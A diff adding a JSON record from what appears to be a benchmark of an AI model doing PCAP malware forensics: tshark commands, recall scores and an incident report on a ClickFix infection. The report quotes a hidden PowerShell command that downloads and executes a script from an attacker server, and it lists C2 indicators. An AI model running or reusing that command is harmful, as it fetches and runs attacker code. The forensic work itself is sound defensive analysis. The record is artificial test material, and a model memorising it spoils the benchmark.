@@ -1,0 +1,80 @@
+{
+  "run_id": "mta-2025-01-22__A__sonnet__r3",
+  "case": "mta-2025-01-22",
+  "arm": "A",
+  "arm_label": "vanilla",
+  "model": "sonnet",
+  "rep": 3,
+  "returncode": 0,
+  "trajectory": {
+    "tool_calls": 23,
+    "tshark_calls": 13,
+    "tshark_cmds": [
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && /opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -q -z io,phs 2>/dev/null | head -50",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== DHCP ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"dhcp\" -T fields -e ip.src -e ip.dst -e dhcp.option.hostname -e dhcp.option.requested_ip_address -e eth.src 2>/dev/null && \\\necho \"=== NBNS names ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"nbns\" -T fields -e ip.src -e nbns.name 2>/dev/null | sort -u | head -30",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== Kerberos CNames ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"kerberos.CNameString\" -T fields -e ip.src -e kerberos.CNameString 2>/dev/null | sort -u | head -20",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.src==10.1.17.215 && http.request\" -T fields -e frame.time -e ip.dst -e tcp.dstport -e http.host -e http.request.method -e http.request.uri -e http.user_agent 2>/dev/null | head -100",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== DNS queries from victim (unique) ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.src==10.1.17.215 && dns.flags.response==0\" -T fields -e dns.qry.name 2>/dev/null | sort -u | grep -viE \"microsoft|windows|msftconnecttest|akamai|arc-msedge|edgedl|ntp|in-addr\" ",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== TLS SNI to suspicious domains ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"tls.handshake.extensions_server_name\" -T fields -e frame.time -e ip.dst -e tls.handshake.extensions_server_name 2>/dev/null | grep -iE \"authenticatoor|burleson|appointedtime\" \necho \"=== resolve IPs for those domains ===\"\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"dns.resp.name matches \\\"authenticatoor|burleson|appointedtime\\\"\" -T fields -e dns.qry.name -e dns.a 2>/dev/null | sort -u",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== HTTP requests 23:45:20 - 23:46:00 with referer ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.src==10.1.17.215 && http.request && frame.time >= \\\"Jan 22, 2025 23:45:20\\\" && frame.time <= \\\"Jan 22, 2025 23:46:00\\\"\" -T fields -e frame.time -e http.host -e http.request.full_uri -e http.referer 2>/dev/null",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\nmkdir -p /tmp/mta_objs && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap --export-objects \"http,/tmp/mta_objs\" -q 2>/dev/null && \\\nls -la /tmp/mta_objs",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== all get-file requests (full list) ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.src==10.1.17.215 && http.request && http.request.uri contains \\\"get-file\\\"\" -T fields -e frame.time -e http.request.uri 2>/dev/null && \\\necho \"=== unique external dest IPs+ports from victim (excluding 443/80/53/dns etc for a summary of ports) ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.src==10.1.17.215 && ip.dst!=10.1.17.0/24 && tcp.flags.syn==1 && tcp.flags.ack==0\" -T fields -e ip.dst -e tcp.dstport 2>/dev/null | sort -u",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"dns.qry.name contains \\\"dyngate\\\" or dns.qry.name contains \\\"teamviewer\\\"\" -T fields -e dns.qry.name -e dns.a 2>/dev/null | sort -u && \\\necho \"=== stream to 45.125.66.32:2917 ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.addr==45.125.66.32\" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e _ws.col.Protocol -e frame.len 2>/dev/null | head -20",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== last few get-file/beacon requests to 5.252.153.241 ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.dst==5.252.153.241 && http.request\" -T fields -e frame.time -e http.request.uri 2>/dev/null | tail -10 && \\\necho \"=== capture time range ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -T fields -e frame.time 2>/dev/null | tail -1 && \\\necho \"=== any TeamViewer 5938 traffic ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"tcp.port==5938\" -T fields -e ip.src -e ip.dst 2>/dev/null | sort -u | head",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\necho \"=== DNS query times for the 3 domains ===\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"dns.qry.name matches \\\"authenticatoor|burleson|appointedtime\\\" && dns.flags.response==0\" -T fields -e frame.time -e dns.qry.name 2>/dev/null",
+      "cd \"/Users/yaakulyasabbani/Documents/GitHub/latex_researchpapers/Skill_Issue_LLM_PCAP_Forensics/datasets/evidence/mta-2025-01-22\" && \\\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"ip.dst==5.252.153.241 && http.request.uri==\\\"/api/file/get-file/TV\\\" or http.request.uri==\\\"/api/file/get-file/TeamViewer\\\" or http.request.uri==\\\"/api/file/get-file/Teamviewer_Resource_fr\\\"\" -T fields -e http.request.method -e http.request.uri -e http.response.code 2>/dev/null\necho \"=== response content-types for these ===\"\n/opt/homebrew/bin/tshark -r 2025-01-22-traffic-analysis-exercise.pcap -Y \"http.response && ip.src==5.252.153.241\" -T fields -e frame.time -e http.request_in -e http.content_type -e http.content_length 2>/dev/null | head -20"
+    ],
+    "input_tokens": 48,
+    "output_tokens": 13268,
+    "num_turns": 24,
+    "duration_ms": 207044,
+    "cost_usd": 0.8394737999999999,
+    "wall_time_s": 208.2
+  },
+  "score": {
+    "recall": 0.875,
+    "iocs_found": 7,
+    "iocs_total": 8,
+    "recall_by_type": {
+      "victim_ip": {
+        "found": 1,
+        "total": 1
+      },
+      "victim_mac": {
+        "found": 1,
+        "total": 1
+      },
+      "victim_hostname": {
+        "found": 1,
+        "total": 1
+      },
+      "victim_user": {
+        "found": 1,
+        "total": 1
+      },
+      "domain": {
+        "found": 1,
+        "total": 1
+      },
+      "c2_endpoint": {
+        "found": 2,
+        "total": 3
+      }
+    },
+    "victim_fields": {
+      "victim_ip": true,
+      "victim_mac": true,
+      "victim_hostname": true,
+      "victim_user": true
+    },
+    "victim_correct": 4,
+    "victim_total": 4,
+    "family_correct": null,
+    "hallucinated_ips": [],
+    "hallucinated_domains": [],
+    "hallucination_count": 0,
+    "ioc_tokens_emitted": 14,
+    "hallucination_rate": 0.0
+  },
+  "final_text": "All confirmed. I have the full picture now.\n\n---\n\n# Incident Report \u2014 MTA 2025-01-22 Traffic Analysis\n\n## Victim host\n\n| Attribute | Value |\n|---|---|\n| IPv4 address | **10.1.17.215** |\n| MAC address | **00:d0:b7:26:4a:74** |\n| Windows hostname | **DESKTOP-L8C5GSJ** (AD domain `bluemoontuesday.com`, workgroup name `BLUEMOONTUESDAY` in NBNS) |\n| Logged-in Windows user | **shutchenson** (seen as Kerberos AS-REQ CNameString from 10.1.17.215) |\n\n## Malware family and attribution\n\n**ClickFix-style fake-verification loader deploying a PowerShell backdoor, followed by covert TeamViewer RAT installation.**\n\nAttribution is **behavioral, not signature-confirmed** \u2014 the evidence directory contains only the raw pcap (no Suricata/IDS alert export), so there is no signature hit to cite. The classification is based on the following observed behavior chain, which matches the well-documented \"ClickFix\" social-engineering pattern (fake CAPTCHA/\"verify you are human\" page tricks the user into pasting an `mshta`/PowerShell command into the Windows Run dialog):\n\n1. **23:45:34\u201323:45:49** \u2014 victim resolves and TLS-connects to a chain of fake-verification lure domains: `google-authenticator.burleson-appliance.net` \u2192 `authenticatoor.org` \u2192 `appointedtimeagriculture.com` (the \"authenticatoor\" name matches known ClickFix page-builder infrastructure used to generate fake Google/Cloudflare verification pages).\n2. **23:45:56** \u2014 victim fetches `http://5.252.153.241/api/file/get-file/264872`, an HTA/VBScript \"component\" that:\n   - decoy-opens `https://azure.microsoft.com` in the browser to look legitimate\n   - silently runs `powershell -WindowStyle Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://5.252.153.241/api/file/get-file/29842.ps1')\"`\n3. **23:45:58** \u2014 `29842.ps1` is fetched and executed. Decoded, it computes the C: drive **volume serial number** as a bot ID, then loops forever: `GET http://5.252.153.241/<serial>` every ~5 seconds and `Invoke-Expression`s whatever the server returns \u2014 a live interactive PowerShell command-and-control channel. This beacon (`GET /1517096937`) runs continuously from 23:45:58 through the end of the capture (00:38:18), including status callbacks such as `?k=script: RunRH, status: OK, message: PS process started` and `?k=message = startup shortcut created; status = success;`, i.e. persistence was installed.\n4. **23:47:01\u201323:47:05** \u2014 the C2 pushes down and the host silently installs a full **TeamViewer** remote-access client (`TeamViewer`, `Teamviewer_Resource_fr`, `TV`) plus a second obfuscated PowerShell payload (`pas.ps1`, functionally identical to `29842.ps1`), giving the actor hands-on-keyboard remote control disguised as a legitimate remote-support tool.\n5. **23:59:46** \u2014 victim establishes an outbound TLS session to `45.125.66.32:2917`, consistent with a TeamViewer relay/session connection, indicating an operator took interactive control of the host.\n\nThis \"ClickFix lure \u2192 PowerShell disk-serial C2 loop \u2192 covert TeamViewer install\" chain is a recognized technique for remote-access-trojan delivery; it is reported here as a behavioral finding since no AV/IDS detection name was present in the evidence set.\n\n## Indicators of Compromise\n\n**C2 endpoints**\n- `5.252.153.241:80` \u2014 primary C2: staging server for payload delivery (`/api/file/get-file/*`) and the disk-serial-keyed command loop (`GET /<serial>` every ~5s)\n- `45.125.66.32:2917` \u2014 TeamViewer/relay TLS session post-compromise (interactive remote-control traffic)\n\n**Malicious/lure domains (DNS-resolved and TLS-connected to from the victim)**\n- `google-authenticator.burleson-appliance.net` \u2192 104.21.64.1 (Cloudflare-fronted)\n- `authenticatoor.org` \u2192 82.221.136.26\n- `appointedtimeagriculture.com` \u2192 217.70.186.109\n- `master16.teamviewer.com` \u2192 185.188.32.26 (legitimate TeamViewer infra, abused post-install)\n- `ping3.dyngate.com` (TeamViewer keep-alive, abused post-install)\n\n**Malicious URLs**\n- `http://5.252.153.241/api/file/get-file/264872` (HTA/VBScript ClickFix launcher)\n- `http://5.252.153.241/api/file/get-file/29842.ps1` (obfuscated PowerShell backdoor loader)\n- `http://5.252.153.241/api/file/get-file/pas.ps1` (second-stage copy of the loader)\n- `http://5.252.153.241/api/file/get-file/TeamViewer`\n- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`\n- `http://5.252.153.241/api/file/get-file/TV`\n- `http://5.252.153.241/<disk-serial-number>` (e.g. `/1517096937`) \u2014 the recurring C2 beacon/command channel\n\n**Transferred files and SHA-256 hashes** (extracted directly from the pcap via `tshark --export-objects`)\n\n| File | Size | SHA-256 |\n|---|---|---|\n| 264872 (VBScript/HTA component) | 417 B | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 |\n| 29842.ps1 (PowerShell backdoor loader) | 1,512 B | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded |\n| pas.ps1 (PowerShell backdoor loader, 2nd copy) | 1,553 B | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |\n| TeamViewer (PE32 GUI exe) | 4,380,968 B | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e |\n| Teamviewer_Resource_fr (PE32 DLL) | 668,968 B | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 |\n| TV (PE32 DLL, stripped) | 12,920 B | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 |\n\n## Summary\n\nDESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged on as domain user `shutchenson`, was compromised via a ClickFix-style fake-verification lure that led to execution of an obfuscated PowerShell backdoor communicating with 5.252.153.241 over an infinite disk-serial-keyed command loop. The actor used this channel to push a legitimate-but-abused TeamViewer client onto the host, then pivoted to interactive remote control (TLS session to 45.125.66.32:2917). The C2 beacon was still active at the end of the capture (00:38:18), indicating the compromise was ongoing when collection stopped."
+}
